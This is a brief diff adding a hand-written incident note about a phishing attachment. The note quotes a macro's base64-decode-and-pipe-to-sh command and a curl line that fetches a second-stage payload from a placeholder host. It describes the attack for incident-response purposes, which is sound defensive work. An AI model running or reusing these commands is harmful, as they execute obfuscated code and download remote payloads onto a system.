@@ -1,0 +1,12 @@
+Incident note, typed up by hand from a phishing report.
+
+The attachment's macro shelled out to:
+
+    echo aGVsbG8sIHdvcmxkCg== | base64 -d | sh
+
+and the script it decoded fetched a second stage with:
+
+    curl -s http://example.invalid/stage2 -o /tmp/stage2
+
+Both lines are quoted here as plain text. Nothing in this file is executable,
+and there is no sample attached to it - it is a description of one.
